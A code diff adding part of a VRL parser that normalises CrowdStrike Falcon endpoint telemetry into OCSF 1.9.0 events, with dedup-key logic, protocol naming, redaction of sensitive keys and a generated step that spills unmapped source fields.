+          }
+          if contains(pattern_disp, "quarantin") {
+              disposition_id = 3; disposition = "Quarantined"; action_id = 2; action = "Denied"
+          }
+          ocsf.disposition_id = disposition_id
+          ocsf.disposition = disposition
+          ocsf.action_id = action_id
+          ocsf.action = action
+
+          # 2004 status_id is the FINDING lifecycle, not success/failure.
+          state = downcase(to_string(ev.State) ?? "")
+          status_id = 1
+          status = "New"
+          if state == "closed" || state == "resolved" { status_id = 4; status = "Resolved" }
+          if state == "in_progress" { status_id = 2; status = "In Progress" }
+          ocsf.status_id = status_id
+          ocsf.status = status
+
+          # Falcon reports ATT&CK by NAME (Tactic/Technique), not by T-number.
+          attacks = []
+          tactic = to_string(ev.Tactic) ?? ""
+          technique = to_string(ev.Technique) ?? ""
+          if tactic != "" || technique != "" {
+              attack = {}
+              if tactic != "" { attack.tactic = { "name": tactic } }
+              if technique != "" { attack.technique = { "name": technique } }
+              attacks = push(attacks, attack)
+          }
+          if length(attacks) > 0 { ocsf.attacks = attacks }
+
+          ocsf.unmapped = {
+              "event_simple_name": event_name,
+              "falcon_host_link": to_string(ev.FalconHostLink) ?? null,
+              "severity_name": to_string(ev.SeverityName) ?? null,
+              "ioc_type": to_string(ev.IOCType) ?? null,
+              "ioc_value": to_string(ev.IOCValue) ?? null,
+              "pattern_disposition": to_string(ev.PatternDispositionDescription) ?? null,
+              "pattern_disposition_value": to_int(ev.PatternDispositionValue) ?? null,
+              "incident_type": to_string(ev.IncidentType) ?? null,
+              "lateral_movement": to_int(ev.LateralMovement) ?? null,
+              "fine_score": to_int(ev.FineScore) ?? null
+          }
+      } else if event_name == "InstalledApplication" {
+          class_uid = 5020
+          class_name = "Software Inventory Info"
+          category_uid = 5
+          category_name = "Discovery"
+          activity_id = 2
+          activity_name = "Collect"
+          product = { "name": to_string(ev.AppName) ?? "" }
+          app_version = to_string(ev.AppVersion) ?? ""
+          if app_version != "" { product.version = app_version }
+          app_vendor = to_string(ev.AppVendor) ?? ""
+          if app_vendor != "" { product.vendor_name = app_vendor }
+          app_path = to_string(ev.AppInstallPath) ?? ""
+          if app_path != "" { product.path = app_path }
+          ocsf.product = product
+          ocsf.device = device
+          ocsf.unmapped = {
+              "event_simple_name": event_name,
+              "app_installed_date": to_string(ev.AppInstalledDate) ?? null
+          }
+      } else if event_name == "OsVersionInfo" {
+          class_uid = 5001
+          class_name = "Device Inventory Info"
+          category_uid = 5
+          category_name = "Discovery"
+          activity_id = 2
+          activity_name = "Collect"
+          os_name = to_string(ev.ProductName) ?? ""
+          if os_name == "" { os_name = "Unknown" }
+          platform = downcase(to_string(ev.event_platform) ?? "")
+          os_type_id = 0
+          if platform == "win" { os_type_id = 100 }
+          if platform == "lin" { os_type_id = 200 }
+          if platform == "mac" { os_type_id = 300 }
+          os_obj = { "name": os_name, "type_id": os_type_id }
+          os_build = to_string(ev.BuildNumber) ?? ""
+          if os_build != "" { os_obj.build = os_build }
+          os_major = to_string(ev.MajorVersion) ?? ""
+          os_minor = to_string(ev.MinorVersion) ?? ""
+          if os_major != "" { os_obj.version = os_major + "." + os_minor }
+          device.os = os_obj
+          ocsf.device = device
+          ocsf.unmapped = {
+              "event_simple_name": event_name,
+              "os_product_type": to_string(ev.ProductType) ?? null,
+              "service_pack_major": to_string(ev.ServicePackMajor) ?? null
+          }
+      } else {
+          # Unhandled event_simpleName -> Process Activity / Other, carrying
+          # whatever process context the record happens to have.
+          ocsf.process = image_process
+          ocsf.actor = { "process": context_process, "user": actor_user }
+          ocsf.device = device
+          ocsf.unmapped = { "event_simple_name": event_name }
+      }
+
+      # ---- common envelope ----------------------------------------------
+      ocsf.class_uid = class_uid
+      ocsf.class_name = class_name
+      ocsf.category_uid = category_uid
+      ocsf.category_name = category_name
+      ocsf.activity_id = activity_id
+      ocsf.activity_name = activity_name
+      ocsf.type_uid = class_uid * 100 + activity_id
+      ocsf.severity_id = severity_id
+      ocsf.severity = severity
+      ocsf.time = time_ms
+      ocsf.raw_data = raw_log
+
+      # NAN-3721: metadata.uid is the lake's dedup key, so it must name ONE
+      # record: DetectId, EventUUID, or the per-event `id` UUID FDR records
+      # carry. The old aid+event_simpleName+millisecond fallback named a group:
+      # one host emits many events of one type in the same millisecond (DNS,
+      # network, image loads), and they collapsed into one row. Without a
+      # per-event id the raw record is hashed (a redelivery repeats it byte for
+      # byte, so it still dedupes).
+      record_uid = to_string(ev.DetectId) ?? ""
+      if record_uid == "" { record_uid = to_string(ev.EventUUID) ?? "" }
+      if record_uid == "" && !is_streaming { record_uid = to_string(ev.id) ?? "" }
+      if record_uid == "" { record_uid = sha2("crowdstrike_falcon|raw|" + raw_log, variant: "SHA-256") }
+
+      ocsf.metadata = {
+          "version": "1.9.0",
+          "profiles": profiles,
+          "uid": record_uid,
+          "event_code": event_name,
+          "log_source": "crowdstrike_falcon",
+          "log_provider": "CrowdStrike Falcon",
+          "product": { "name": "Falcon", "vendor_name": "CrowdStrike" }
+      }
+      if stream_offset != null { ocsf.metadata.correlation_uid = to_string(stream_offset) }
+      # NAN-3718: original_event_uid holds the vendor's own per-event id and is
+      # omitted when the record has none; a composite or hash belongs only in
+      # metadata.uid.
+      # Falcon: DetectId on a detection, else EventUUID, else the per-event
+      # `id` UUID that FDR records carry.
+      native_uid = to_string(ev.DetectId) ?? ""
+      if native_uid == "" { native_uid = to_string(ev.EventUUID) ?? "" }
+      if native_uid == "" && !is_streaming { native_uid = to_string(ev.id) ?? "" }
+      if native_uid != "" { ocsf.metadata.original_event_uid = native_uid }
+
+      # NAN-3342: publish the canonical lowercase name beside known IANA ids.
+      # Unknown numbers retain their id without inventing a name.
+      protocol_names = { "1": "icmp", "2": "igmp", "6": "tcp", "17": "udp", "41": "ipv6", "47": "gre", "50": "esp", "51": "ah", "58": "icmpv6", "89": "ospf", "132": "sctp" }
+      protocol_name = get(protocol_names, [to_string(ocsf.connection_info.protocol_num)]) ?? null
+      if is_string(protocol_name) { ocsf.connection_info.protocol_name = protocol_name }
+      . = ocsf
+  }
+
+  # NAN-2421 residual spill. Generated by scripts/residual_spill.py; edit the template.
+  # __source_kv is a local variable, never an OCSF attribute. The checker instruments
+  # this marker to observe the parsed source without changing production output.
+  # Exact value representation is evaluated AFTER branch selection. Numeric strings
+  # count as represented by their typed scalar; other transformations are explicit.
+  # NAN-5351: VRL copies a variable on every read, so an array or object used as a
+  # lookup set costs a full copy per lookup. The value sets below are strings
+  # instead (a read shares the buffer): "," + encode_json(member) per member, and
+  # contains(set, "," + encode_json(x)) is exact membership. Every member is a
+  # JSON text, inside which a '"' is always escaped, so ',"' only ever starts a
+  # member, and a JSON string ends at its first unescaped '"'. The fixed candidate
+  # set is a regex literal, compiled once with the program.
+  # __mapped holds only JSON types, so to_string equals encode_json for an integer
+  # or a boolean and only strings and floats add a second member.
+  # raw_data and unmapped are dropped before the JSON round trip, not after it.
+  __mapped = .
+  __discard = del(__mapped.raw_data)
+  __existing = del(__mapped.unmapped)
+  __existing = object(parse_json!(encode_json(__existing))) ?? {}
+  __mapped_json = encode_json(__mapped)
+  __mapped = object!(parse_json!(__mapped_json))
+  if __mapped.message == __raw_body { __discard = del(__mapped.message) }
+  __safe = object!(parse_json!(encode_json({"source": __source_kv, "existing": __existing})))
+  __safe_json = encode_json(__safe)
+  # Object and array members are encodings: an empty object, an object that
+  # opens with a quoted key, or an array. A lookup can ask for one only when some
+  # source or existing value is an array, or a string spelling one of those
+  # openings, and the regex below finds either in the JSON text (brackets are
+  # written as hex escapes because nano's deploy check counts them raw).
+  # Otherwise the scalar nodes suffice; a Sysmon GUID, a brace-wrapped string
+  # with no quoted key, is no object member. The leaves of flatten(), with arrays
+  # flattened too, are every scalar node unless a key holds a literal '.' (in
+  # compact JSON only a key is followed by ':').
+  # Their encodings, unwrapped from the array, already are the string members.
+  __represented = ""
+  __nodes = __mapped
+  if !match(__safe_json, r'"(?:\x7B\\"|\x7B\x7D"|\x5B)|[:,\x5B]\x5B') && !match(__mapped_json, r'\.(?:[^"\\]|\\.)*":') {
+      __leaves = flatten(values(flatten(__mapped)))
+      __leaves_json = encode_json(__leaves)
+      if match(__leaves_json, r'\x7B') {
+          # An object inside an array: walk the leaves, objects whole.
+          __nodes = __leaves
+      } else {
+          __nodes = []
+          __members = map_values(__leaves) -> |value| {
+              if is_float(value) {
+                  encode_json(encode_json(value)) + "," + encode_json(to_string!(value))
+              } else {
+                  encode_json(encode_json(value))
+              }
+          }
+          __represented = "," + join!(__members, ",") + "," + slice!(__leaves_json, 1, -1)
+      }
+  }
+  __walk = map_values(__nodes, recursive: true) -> |value| {
+      __json = encode_json(value)
+      if is_string(value) {
+          # A string's second member is the string itself, encoded: __json.
+          __represented = __represented + ("," + encode_json(__json) + "," + __json)
+      } else if is_float(value) {
+          __represented = __represented + ("," + encode_json(__json) + "," + encode_json(to_string!(value)))
+      } else {
+          __represented = __represented + ("," + encode_json(__json))
+      }
+      value
+  }
+  __consumed = ""
+  # BEGIN parser-specific transformations
+  # ComputerName: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.ComputerName: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # Hostname: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.Hostname: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # aip: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.aip: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # UserName: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.UserName: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # UserId: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.UserId: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # LogonDomain: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.LogonDomain: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # MachineDomain: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.MachineDomain: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # SHA256HashData: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.SHA256HashData: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # SHA256String: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.SHA256String: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # SHA1HashData: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.SHA1HashData: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # MD5HashData: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.MD5HashData: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # MD5String: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.MD5String: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # LocalAddressIP4: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.LocalAddressIP4: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # LocalAddressIP6: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.LocalAddressIP6: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # RemoteAddressIP4: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.RemoteAddressIP4: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # RemoteAddressIP6: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.RemoteAddressIP6: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # DomainName: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.DomainName: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # AuthenticationPackage: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.AuthenticationPackage: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # UserIp: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.UserIp: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # Success: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.Success: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # LocalIP: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.LocalIP: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # PatternDispositionDescription: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.PatternDispositionDescription: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # State: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.State: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event_platform: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # event.event_platform: Parser lowercases this hostname, address, identity or hash; consume only if the normalized value is emitted.
+  # @timestamp: ISO clock converted to epoch milliseconds; only the selected successful clock is consumed.
+  # event.@timestamp: ISO clock converted to epoch milliseconds; only the selected successful clock is consumed.
+  # ContextTimeStamp: Falcon epoch seconds converted to milliseconds; verify the emitted event clock.
+  # ProcessStartTime: Falcon epoch seconds converted to milliseconds; verify the emitted event clock.
+  # event.ContextTimeStamp: Falcon epoch seconds converted to milliseconds; verify the emitted event clock.
+  # event.ProcessStartTime: Falcon epoch seconds converted to milliseconds; verify the emitted event clock.
+  # TaskAuthor: Case normalization already performed by the parser; observed at job.user.name, and checked against the emitted branch.
+  for_each(flatten(__source_kv)) -> |key, value| {
+      if match(key, r'(?x)
+      \A(?:
+        ComputerName
+      | event\.ComputerName
+      | Hostname
+      | event\.Hostname
+      | aip
+      | event\.aip
+      | UserName
+      | event\.UserName
+      | UserId
+      | event\.UserId
+      | LogonDomain
+      | event\.LogonDomain
+      | MachineDomain
+      | event\.MachineDomain
+      | SHA256HashData
+      | event\.SHA256HashData
+      | SHA256String
+      | event\.SHA256String
+      | SHA1HashData
+      | event\.SHA1HashData
+      | MD5HashData
+      | event\.MD5HashData
+      | MD5String
+      | event\.MD5String
+      | LocalAddressIP4
+      | event\.LocalAddressIP4
+      | LocalAddressIP6
+      | event\.LocalAddressIP6
+      | RemoteAddressIP4
+      | event\.RemoteAddressIP4
+      | RemoteAddressIP6
+      | event\.RemoteAddressIP6
+      | DomainName
+      | event\.DomainName
+      | AuthenticationPackage
+      | event\.AuthenticationPackage
+      | UserIp
+      | event\.UserIp
+      | Success
+      | event\.Success
+      | LocalIP
+      | event\.LocalIP
+      | PatternDispositionDescription
+      | event\.PatternDispositionDescription
+      | State
+      | event\.State
+      | event_platform
+      | event\.event_platform
+      | TaskAuthor
+      )\z') {
+          __value = value
+          if is_string(__value) {
+              __expected = downcase(string!(__value))
+              if contains(__represented, "," + encode_json(encode_json(__expected))) { __consumed = __consumed + ("," + encode_json(key)) }
+          }
+      }
+      if match(key, r'(?x)
+      \A(?:
+        @timestamp
+      | event\.@timestamp
+      )\z') {
+          __value = value
+          __clock, __clock_err = parse_timestamp(string(__value) ?? "", "%+")
+          if __clock_err == null {
+              __expected = to_unix_timestamp(__clock, unit: "milliseconds")
+              if ."time" == __expected { __consumed = __consumed + ("," + encode_json(key)) }
+          }
+      }
+      if match(key, r'(?x)
+      \A(?:
+        ContextTimeStamp
+      | ProcessStartTime
+      | event\.ContextTimeStamp
+      | event\.ProcessStartTime
+      )\z') {
+          __value = value
+          __number, __number_err = to_float(__value)
+          if __number_err == null && __value != null && !is_boolean(__value) {
+              __expected = to_int(__number * 1000.0)
+              if ."time" == __expected { __consumed = __consumed + ("," + encode_json(key)) }
+          }
+      }
+  }
+  # Only source keys read by this parser are eligible for exact-value consumption; the selected branch must emit the value. Unknown keys always spill, even when their value equals an OCSF default.
+  __candidates = r'(?x)
+  \A(?:
+    AgentIdString
+  | AppInstallPath
+  | AppInstalledDate
+  | AppName
+  | AppVendor
+  | AppVersion
+  | AsepClass
+  | AuthenticationId
+  | AuthenticationPackage
+  | BuildNumber
+  | BytesReceived
+  | BytesSent
+  | CommandLine
+  | CompositeId
+  | ComputerName
+  | ConnectionDirection
+  | ConnectionFlags
+  | ContentType
+  | ContextProcessId
+  | ContextTimeStamp
+  | DetectDescription
+  | DetectId
+  | DetectName
+  | DnsRequestCount
+  | DomainName
+  | EventOrigin
+  | EventUUID
+  | FalconHostLink
+  | FileIdentifier
+  | FileName
+  | FileOperatorSid
+  | FilePath
+  | FineScore
+  | Hostname
+  | IOCType
+  | IOCValue
+  | IP4Records
+  | IP6Records
+  | ImageFileName
+  | InContext
+  | IncidentId
+  | IncidentType
+  | InjectedProcessId
+  | InjectedProcessImageFileName
+  | InjectedThread
+  | InjectingProcessId
+  | InjectingProcessImageFileName
+  | IntegrityLevel
+  | IsOnNetwork
+  | IsOnRemovableDisk
+  | LateralMovement
+  | LocalAddressIP4
+  | LocalAddressIP6
+  | LocalIP
+  | LocalPort
+  | LogonDomain
+  | LogonId
+  | LogonServer
+  | LogonType
+  | MD5HashData
+  | MD5String
+  | MachineDomain
+  | MajorVersion
+  | MinorVersion
+  | OperationName
+  | ParentBaseFileName
+  | ParentCommandLine
+  | ParentImageFileName
+  | ParentProcessId
+  | PatternDispositionDescription
+  | PatternDispositionValue
+  | ProcessGroupId
+  | ProcessId
+  | ProcessStartTime
+  | ProductName
+  | ProductType
+  | Protocol
+  | QueryStatus
+  | RawProcessId
+  | RemoteAccount
+  | RemoteAddressIP4
+  | RemoteAddressIP6
+  | RemotePort
+  | RequestType
+  | SHA1HashData
+  | SHA256HashData
+  | SHA256String
+  | ScriptContent
+  | ScriptContentName
+  | ScriptContentSource
+  | ServiceDisplayName
+  | ServiceImagePath
+  | ServiceName
+  | ServiceObjectName
+  | ServicePackMajor
+  | ServiceStartType
+  | ServiceType
+  | Severity
+  | SeverityName
+  | SignInfoFlags
+  | Size
+  | SourceProcessId
+  | State
+  | Status
+  | SubStatus
+  | Success
+  | Tactic
+  | TargetDirectoryName
+  | TargetFileName
+  | TargetObjectData
+  | TargetObjectName
+  | TargetObjectPath
+  | TargetProcessId
+  | TaskAuthor
+  | TaskExecArguments
+  | TaskExecCommand
+  | TaskName
+  | Technique
+  | TokenType
+  | UTCTimestamp
+  | UserId
+  | UserIp
+  | UserIsAdmin
+  | UserName
+  | UserSid
+  | aid
+  | aip
+  | event
+  | event\.AgentIdString
+  | event\.AppInstallPath
+  | event\.AppInstalledDate
+  | event\.AppName
+  | event\.AppVendor
+  | event\.AppVersion
+  | event\.AsepClass
+  | event\.AuthenticationId
+  | event\.AuthenticationPackage
+  | event\.BuildNumber
+  | event\.BytesReceived
+  | event\.BytesSent
+  | event\.CommandLine
+  | event\.CompositeId
+  | event\.ComputerName
+  | event\.ConnectionDirection
+  | event\.ConnectionFlags
+  | event\.ContentType
+  | event\.ContextProcessId
+  | event\.ContextTimeStamp
+  | event\.DetectDescription
+  | event\.DetectId
+  | event\.DetectName
+  | event\.DnsRequestCount
+  | event\.DomainName
+  | event\.EventOrigin
+  | event\.EventUUID
+  | event\.FalconHostLink
+  | event\.FileIdentifier
+  | event\.FileName
+  | event\.FileOperatorSid
+  | event\.FilePath
+  | event\.FineScore
+  | event\.Hostname
+  | event\.IOCType
+  | event\.IOCValue
+  | event\.IP4Records
+  | event\.IP6Records
+  | event\.ImageFileName
+  | event\.InContext
+  | event\.IncidentId
+  | event\.IncidentType
+  | event\.InjectedProcessId
+  | event\.InjectedProcessImageFileName
+  | event\.InjectedThread
+  | event\.InjectingProcessId
+  | event\.InjectingProcessImageFileName
+  | event\.IntegrityLevel
+  | event\.IsOnNetwork
+  | event\.IsOnRemovableDisk
+  | event\.LateralMovement
+  | event\.LocalAddressIP4
+  | event\.LocalAddressIP6
+  | event\.LocalIP
+  | event\.LocalPort
+  | event\.LogonDomain
+  | event\.LogonId
+  | event\.LogonServer
+  | event\.LogonType
+  | event\.MD5HashData
+  | event\.MD5String
+  | event\.MachineDomain
+  | event\.MajorVersion
+  | event\.MinorVersion
+  | event\.OperationName
+  | event\.ParentBaseFileName
+  | event\.ParentCommandLine
+  | event\.ParentImageFileName
+  | event\.ParentProcessId
+  | event\.PatternDispositionDescription
+  | event\.PatternDispositionValue
+  | event\.ProcessGroupId
+  | event\.ProcessId
+  | event\.ProcessStartTime
+  | event\.ProductName
+  | event\.ProductType
+  | event\.Protocol
+  | event\.QueryStatus
+  | event\.RawProcessId
+  | event\.RemoteAccount
+  | event\.RemoteAddressIP4
+  | event\.RemoteAddressIP6
+  | event\.RemotePort
+  | event\.RequestType
+  | event\.SHA1HashData
+  | event\.SHA256HashData
+  | event\.SHA256String
+  | event\.ScriptContent
+  | event\.ScriptContentName
+  | event\.ScriptContentSource
+  | event\.ServiceDisplayName
+  | event\.ServiceImagePath
+  | event\.ServiceName
+  | event\.ServiceObjectName
+  | event\.ServicePackMajor
+  | event\.ServiceStartType
+  | event\.ServiceType
+  | event\.Severity
+  | event\.SeverityName
+  | event\.SignInfoFlags
+  | event\.Size
+  | event\.SourceProcessId
+  | event\.State
+  | event\.Status
+  | event\.SubStatus
+  | event\.Success
+  | event\.Tactic
+  | event\.TargetDirectoryName
+  | event\.TargetFileName
+  | event\.TargetObjectData
+  | event\.TargetObjectName
+  | event\.TargetObjectPath
+  | event\.TargetProcessId
+  | event\.TaskAuthor
+  | event\.TaskExecArguments
+  | event\.TaskExecCommand
+  | event\.TaskName
+  | event\.Technique
+  | event\.TokenType
+  | event\.UTCTimestamp
+  | event\.UserId
+  | event\.UserIp
+  | event\.UserIsAdmin
+  | event\.UserName
+  | event\.UserSid
+  | event\.aid
+  | event\.aip
+  | event\.event_platform
+  | event\.event_simpleName
+  | event\.timestamp
+  | event_platform
+  | event_simpleName
+  | metadata\.eventCreationTime
+  | metadata\.eventType
+  | metadata\.offset
+  | timestamp
+  )\z'
+  __preserve = []
+  # END parser-specific transformations
+  # Redact at every depth, including objects inside arrays, before serialization.
+  # Redaction needs a sensitive word in a key or a name/key value, and encode_json
+  # never escapes a letter, so text without one of the words needs no walk.
+  if match(downcase(__safe_json), r'password|secret|authorization|token') {
+      __safe = map_values(__safe, recursive: true) -> |value| {
+          if is_object(value) {
+              # Header/parameter arrays commonly encode sensitive keys as name/value
+              # or Key/Value objects instead of using the secret name as an object key.
+              __sensitive_pair = false
+              for_each(object!(value)) -> |key, child| {
+                  if includes(["name", "key"], downcase(key)) && match(downcase(string(child) ?? ""), r'password|secret|authorization|token') {
+                      __sensitive_pair = true
+                  }
+              }
+              for_each(object!(value)) -> |key, _child| {
+                  if match(downcase(key), r'password|secret|authorization|token') || (__sensitive_pair && includes(["value", "values"], downcase(key))) {
+                      value = set!(value, [key], "<redacted>")
+                  }
+              }
+          }
+          value
+      }
+  }
+  # Escape literal dots before flattening so dotted source keys cannot overwrite
+  # nested paths. Decode for naming, and disambiguate collisions with suffixes.
+  # In compact JSON only an object key is followed by ':', so a source whose text
+  # has no '.' or '~' followed by the rest of a string and then ':' has no key to
+  # escape. ('.' and '~' are never the escaped half of a JSON escape.)
+  __escaped = object!(__safe.source)
+  __tilde = false
+  if match(encode_json(__escaped), r'[.~](?:[^"\\]|\\.)*":') {
+      __escaped = map_keys(__escaped, recursive: true) -> |key| {
+          replace(replace(key, "~", "~0"), ".", "~1")
+      }
+      # Keys without a "~" decode to themselves, including the object keys inside
+      # an array that flatten leaves escaped; encode_json never escapes a "~".
+      __tilde = contains(encode_json(__escaped), "~")
+  }
+  __flat = flatten(__escaped)
+  # Fast path: when no two source keys decode to the same key and no two spilled
+  # keys get the same name, each key's decision depends only on its own value, so
+  # one filter and one rename build the residual without copying it per key.
+  __distinct = true
+  if __tilde {
+      __distinct = length(map_keys(__flat) -> |key| { replace(replace(key, "~1", "."), "~0", "~") }) == length(__flat)
+  }
+  __kept = {}
+  __names = {}
+  if __distinct {
+      __kept = filter(__flat) -> |key, value| {
+          if __tilde { key = replace(replace(key, "~1", "."), "~0", "~") }
+          # A key is kept unless it is consumed: by a transformation above, or as a
+          # candidate whose value is represented. Redacted leaves always remain
+          # visible. Do not spill a copy of the raw body.
+          if value == __raw_body {
+              false
+          } else if value == "<redacted>" {
+              true
+          } else if contains(__consumed, "," + encode_json(key)) {
+              false
+          } else if !match(key, __candidates) {
+              true
+          } else {
+              # flatten stops at arrays, so objects inside an array still carry the
+              # escaped keys: decode them too, or `a.b` spills as `a~1b` (NAN-3604).
+              if __tilde && (is_array(value) || is_object(value)) {
+                  value = get!(map_keys({"v": value}, recursive: true) -> |inner| {
+                      replace(replace(inner, "~1", "."), "~0", "~")
+                  }, ["v"])
+              }
+              __same = contains(__represented, "," + encode_json(encode_json(value)))
+              if !__same && (is_string(value) || is_float(value)) {
+                  __same = contains(__represented, "," + encode_json(to_string!(value)))
+              }
+              # A scalar array is consumed only if every element is represented. Preserve
+              # partially represented arrays intact, including their ordering and repeats.
+              if !__same && is_array(value) && !is_empty(array!(value)) {
+                  __same = true
+                  for_each(array!(value)) -> |_index, item| {
+                      if __same {
+                          if is_object(item) || is_array(item) {
+                              __same = false
+                          } else if !contains(__represented, "," + encode_json(encode_json(item))) {
+                              __same = (is_string(item) || is_float(item)) && contains(__represented, "," + encode_json(to_string!(item)))
+                          }
+                      }
+                  }
+              }
+              !__same
+          }
+      }
+      __names = map_keys(__kept) -> |key| {
+          if __tilde { key = replace(replace(key, "~1", "."), "~0", "~") }
+          __parts = map_values(split(key, ".")) -> |part| { snakecase(string!(part)) }
+          join!(__parts, ".")
+      }
+  }
+  __residual = {}
+  if __distinct && length(__names) == length(__kept) {
+      __residual = map_values(__names) -> |value| {
+          if is_array(value) || is_object(value) {
+              if __tilde {
+                  value = get!(map_keys({"v": value}, recursive: true) -> |inner| {
+                      replace(replace(inner, "~1", "."), "~0", "~")
+                  }, ["v"])
+              }
+              __complex = is_object(value)
+              if is_array(value) {
+                  for_each(array!(value)) -> |_index, item| {
+                      if is_object(item) || is_array(item) { __complex = true }
+                  }
+              }
+              if __complex { value = encode_json(value) }
+          }
+          value
+      }
+  } else {
+      # Slow path, in source key order: a decoded key consumed earlier stays
+      # consumed, and a name already taken gets the next free _2, _3, ... suffix.
+      for_each(__flat) -> |key, value| {
+          key = replace(replace(key, "~1", "."), "~0", "~")
+          if is_array(value) || is_object(value) {
+              value = get!(map_keys({"v": value}, recursive: true) -> |inner| {
+                  replace(replace(inner, "~1", "."), "~0", "~")
+              }, ["v"])
+          }
+          __same = contains(__represented, "," + encode_json(encode_json(value)))
+          if !__same && (is_string(value) || is_float(value)) {
+              __same = contains(__represented, "," + encode_json(to_string!(value)))
+          }
+          if !__same && is_array(value) && !is_empty(array!(value)) {
+              __same = true
+              for_each(array!(value)) -> |_index, item| {
+                  if __same {
+                      if is_object(item) || is_array(item) {
+                          __same = false
+                      } else if !contains(__represented, "," + encode_json(encode_json(item))) {
+                          __same = (is_string(item) || is_float(item)) && contains(__represented, "," + encode_json(to_string!(item)))
+                      }
+                  }
+              }
+          }
+          __token = "," + encode_json(key)
+          if __same && match(key, __candidates) { __consumed = __consumed + ("," + encode_json(key)) }
+          if (!contains(__consumed, __token) || value == "<redacted>") && value != __raw_body {
+              __parts = map_values(split(key, ".")) -> |part| { snakecase(string!(part)) }
+              __base = join!(__parts, ".")
+              __key = __base
+              __suffix = 2
+              if includes(keys(__residual), __key) {
+                  for_each(__flat) -> |_other_key, _other_value| {
+                      if includes(keys(__residual), __key) {
+                          __key = __base + "_" + to_string(__suffix)
+                          __suffix = __suffix + 1
+                      }
+                  }
+              }
+              __complex = is_object(value)
+              if is_array(value) {
+                  for_each(array!(value)) -> |_index, item| {
+                      if is_object(item) || is_array(item) { __complex = true }
+                  }
+              }
+              __spill = if __complex { encode_json(value) } else { value }
+              __residual = set!(__residual, [__key], __spill)
+          }
+      }
+  }
+  # Keep existing derived evidence, but remove null placeholders and mapped copies.
+  # Source-derived aliases are replaced by canonical dotted source paths above.
+  # Existing aggregates may contain sensitive descendants; the canonical source
+  # spill above is the authoritative representation of containers. The cheap
+  # conditions run first; the source value set is built on first use.
+  __original_values = null
+  for_each(flatten(__existing)) -> |key, value| {
+      if !is_null(value) && value != "" && !is_array(value) && !is_object(value) && value != __raw_body && !match(downcase(key), r'password|secret|authorization|token') {
+          # Members for the value itself and for to_string(value), as above.
+          __json = encode_json(value)
+          __as_json = "," + encode_json(__json)
+          __as_string = __as_json
+          if is_string(value) { __as_string = "," + __json } else if is_float(value) { __as_string = "," + encode_json(to_string!(value)) }
+          if __original_values == null {
+              # __source_kv may hold non-JSON types (a timestamp), so only an
+              # integer or a boolean skips its to_string member here.
+              __original_values = join!(map_values(values(flatten(__source_kv))) -> |source_value| {
+                  __source_json = encode_json(source_value)
+                  __tokens = "," + encode_json(__source_json)
+                  if is_string(source_value) {
+                      __tokens = __tokens + "," + __source_json
+                  } else if !is_object(source_value) && !is_array(source_value) && !is_integer(source_value) && !is_boolean(source_value) {
+                      __tokens = __tokens + "," + encode_json(to_string(source_value) ?? "")
+                  }
+                  __tokens
+              }, "")
+          }
+          __source_set = string!(__original_values)
+          __keep = !contains(__source_set, __as_json) && !contains(__source_set, __as_string)
+          __keep = __keep && !contains(__represented, __as_json) && !contains(__represented, __as_string)
+          # Only text opening an object or an array (after JSON whitespace)
+          # decodes to a container.
